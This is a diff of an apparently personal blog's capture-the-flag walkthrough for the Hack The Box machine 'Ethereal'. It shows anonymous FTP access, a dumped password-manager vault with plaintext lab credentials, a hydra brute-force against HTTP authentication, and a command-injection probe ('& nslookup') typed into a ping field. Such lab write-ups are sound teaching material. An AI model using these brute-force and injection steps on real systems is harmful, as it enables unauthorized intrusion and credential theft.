@@ -9,17 +9,16 @@ tags:
     - machines
     - insane
     - windows
-excerpt:  ""
 ---
 
 
-![alt]({{ site.url }}{{ site.baseurl }}/img_path)
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/ethereal/banner.png)
 
 Before following this walkthrough, I highly recommend trying to get the flag yourself! Just like you will hear from everyone else, try harder! (if you cannot find it)
 
 First up, we'll scan the box using basic nmap scripts and then go from there (Enumerate!).
 
-```console
+```bash
 # Nmap 7.70 scan initiated Sat Mar 23 11:04:51 2019 as: nmap -v -p- -sC -sV -oA nmap 10.10.10.106
 Nmap scan report for 10.10.10.106
 Host is up (0.11s latency).
@@ -44,11 +43,11 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Well, so we have a few ports open, port 21, 80 and 8080.
 
-## Port 21
+## FTP
 
 I always like to check the low-hanging fruit first. So let's get into FTP since `anonymous` login is allowed. This is a common misconfiguration for FTP logins. You never know what you might find but always is useful.
 
-```console
+```bash
 pswapnil@noone:~/Ethereal$ ftp 10.10.10.106
 Connected to 10.10.10.106.
 220 Microsoft FTP Service
@@ -74,7 +73,7 @@ ftp> dir
 
 I created a copy of the FTP data on my local drive. Found a zip file `FDISK.zip`, unzipped it and mounted it as a drive.
 
-```console
+```bash
 pswapnil@noone:~/Ethereal/ftp-data$ mount FDISK fdisk
 pswapnil@noone:~/Ethereal/ftp-data$ ls -la fdisk/pbox
 total 88
@@ -89,7 +88,7 @@ So, I used this [software](https://sourceforge.net/projects/passwbox/files/lates
 
 I copied the `pbox.dat` file I found in the FTP session to my home directory as `.pbox.dat`. After executing the pbox client we just downloaded for Linux, it prompted me for the password.
 
-```console
+```bash
 swapnil@swapnil:/home/swapnil/Downloads $ ./pbox                 
 Enter your master password: password
 ```
@@ -100,7 +99,7 @@ I guessed the password trying out `admin`, `pbox`, etc, got it right for `passwo
 
 Using the `--dump` option, I was able to dump all the usernames and passwords and store them locally.
 
-```console
+```bash
 swapnil@swapnil:/home/swapnil/Downloads $ ./pbox --dump
 Enter your master password: ********
 databases  ->  7oth3B@tC4v3!
@@ -116,7 +115,7 @@ svn  ->  alan53 / Ch3ck1ToU7>
 
 That was it from FTP. I believe, the tedious process to just be able to obtain a dump is evidence that this box isn't an wasy one.
 
-## Port 80 and 8080
+## HTTP
 
 In the web browser, we get the following window as a welcome page.
 
@@ -140,7 +139,7 @@ After the `hosts` file is updated, clicking the `Ping` option again got me an HT
 
 Fortunately, we have a list of usernames and passwords from the dump that we obtained earlier. Use that to brute-force the HTTP authentication.
 
-```console
+```bash
 root@kali# hydra -L usernames -P passwords -s 8080 -f ethereal.htb http-get /
 Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -156,7 +155,7 @@ There's the login. Using that, we find this page.
 
 I put my IP address in the text-field and it showed `Connection to host successful`. Let's try to capture packets this time around using `tcpdump`.
 
-```console
+```bash
 root@kali:~# tcpdump -i tun0 icmp
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
@@ -168,7 +167,7 @@ listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 
 We get 2 pings! Looks weird. Based on a guess, it's running something like `ping -n2 <ip>`. Let's find out if this box allows DNS queries. I'll use `& nslookup abcde <myip>` in the text field. Try to see it using tcpdump.
 
-```console
+```bash
 pswapnil@noone:~/Ethereal$ tcpdump -ni tun0 udp port 53
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
